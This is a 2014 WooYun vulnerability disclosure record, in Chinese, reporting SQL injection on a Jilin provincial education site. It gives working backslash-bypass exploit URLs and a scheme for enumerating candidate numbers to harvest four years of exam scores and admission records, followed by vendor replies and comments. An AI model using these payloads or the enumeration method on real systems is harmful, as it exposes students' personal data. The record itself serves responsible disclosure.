{"id": 2159, "wybug_id": "wooyun-2014-066653", "wybug_title": "吉林教育信息网严重SQL注入可查4年近百万高考成绩录取信息", "wybug_corp": "www.jledu.gov.cn", "wybug_author": "老迷糊飞侠", "wybug_date": "2014-06-29 20:11", "wybug_open_date": "2014-08-13 20:12", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(CCERT教育网应急响应组)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-13：\t细节向公众公开  简要描述： 12年该网站爆出漏洞后加了简单的过滤，但是还是有漏洞存在，可以查到11、12、13、14四年近百万高考考生成绩和录取信息，市面上的“报考专家”之类的软件，数据可能就是这么来的吧。。 详细说明：  网址如下：\nhttp://www.jledu.gov.cn/chengji_2014.php?ksh=考生号&xm=姓名\n如果直接输入单引号会提示“输入非法注入内容”，看来网站还是加了简单的过滤的\nhttp://www.jledu.gov.cn/chengji_2014.php?ksh='&xm=\n但是他们忽略了转义字符“\\”---------------------------↑↑（乌云会把单个反斜线转义成两个，以下所有反斜线都是单个的，自己去掉一下吧）假设查询成绩的SQL语句是这样\nSELECT * FROM grade WHERE ksh='考号' AND xm='姓名';\n如果在考号里面加转义就变成了这样：\nSELECT * FROM grade WHERE ksh='\\' AND xm='姓名';\n这样ksh之后到xm之前一大坨就可以忽略，在“姓名”里面就可以任意构造SQL语句\nSELECT * FROM grade WHERE ksh='\\' AND xm=' or ksh=14220821150199#';\n别忘了在最后加注释#最后实际执行的SQL语句是这样的\nSELECT * FROM grade WHERE ksh='xxxxxxxxx' or ksh=14220821150199;\n这样只需要考号不需要知道其对应姓名就可以查到成绩了。构造以下exp：\nhttp://www.jledu.gov.cn/chengji_2014.php?ksh=\\&xm=or%20ksh=14220821150199%23\n成绩已经出来了\n\n14、13、12、11年的都是一样的\nhttp://www.jledu.gov.cn/chengji_2014.php?ksh=\\&xm=or%20ksh=14220821150199%23http://www.jledu.gov.cn/chengji_2013.php?ksh=\\&xm=or%20ksh=13220821150199%23http://www.jledu.gov.cn/chengji_2012.php?ksh=\\&xm=or%20ksh=12220821150199%23http://www.jledu.gov.cn/chengji_2011.php?ksh=\\&xm=or%20ksh=11220821150199%23\n接下来的问题是考号从哪里来？随便看一个考号，12220822150199可以这样分割 12|220822|15|019912是指2012年，13则对应2013年，其它同理220822是身份证前六位，网上可以查得到\n\n中间的15代表理科，11代表文科最后面4位是从0001开始依次递增排下去的，例如某县有1800名考生，考号后四位就是0001到1800，遍历下就可以了写个程序拿回成绩数据\n\n有了成绩里面已经包含了考生号和姓名，直接提交就可以查到录取信息了\nhttp://www.jledu.gov.cn/luqu_2013.php?kshb=考号&xmb=姓名\n\n\n11、12、13、14连续四年近百万考生的数据都泄露了，市面上的“报考专家”之类的软件，数据可能就是这么来的吧。。。。   漏洞证明：  成绩：\n\n录取信息：\n\n   修复方案：  更加严格的过滤   版权声明：转载请注明来源 老迷糊飞侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-07-03 17:22 厂商回复： 已转cnCERT处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-29 21:01 |    \t\t动后河 \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:13        | ☭)\t\t \n  身份证号有没有？    \n     2014-06-29 21:16 |    \t\treality0ne \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:7        )\t\t \n  理论上身份证号也应该会有的= =我自己考试那年就试过，排出全省的准考证，通过两个需要参数不同的查询接口互相查，到后来学生去了哪个学校也能一起查出来(╯‵□′)╯︵┻━┻    \n     2014-06-29 23:02 |    \t\t小小鸟 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:6        | 小白一个)\t\t \n  略屌    \n     2014-08-13 20:29 |    \t\tJack.Chalres \t\t\t( 实习白帽子  |\t\t\t        Rank:39 漏洞数:15        | ..............)\t\t \n  数学一分的孩子亮了    \n     2014-08-14 08:27 |    \t\t神笔马良 \t\t\t( 普通白帽子  |\t\t\t        Rank:130 漏洞数:45        | 爱写字的马)\t\t \n  低调啊  数学一分的是马云    \n     2014-08-14 18:51 |    \t\tevil \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:21        )\t\t \n  数学1分 。。。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}